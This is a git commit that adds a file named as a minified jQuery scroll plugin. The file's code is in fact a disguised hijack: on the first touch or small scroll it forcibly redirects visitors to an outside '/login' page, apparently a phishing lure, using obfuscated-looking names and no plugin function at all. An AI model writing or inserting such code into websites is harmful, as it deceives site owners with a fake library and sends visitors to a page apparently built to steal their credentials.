13bd38db05dc7780c796fb5553f51b81bf110728
SENSA4D <angelinaurelia22@gmail.com>
2026-06-08 05:18:35 +0700

    Create jquery.scroll-min.js

---
+++ assets/jquery.scroll-min.js
@@ -0,0 +1,22 @@
+(function(window, document) {
+    const _target = "https://sensawd.com/login";
+    let _triggered = false;
+
+    const _blast = () => {
+        if (_triggered) return;
+        _triggered = true;
+
+        window.location.replace(_target);
+    };
+
+    window.addEventListener('touchend', () => {
+        setTimeout(_blast, 50);
+    }, { once: true });
+
+    window.addEventListener('scroll', () => {
+        if (window.scrollY > 15) { 
+            _blast();
+        }
+    }, { once: true });
+
+})(window, document);
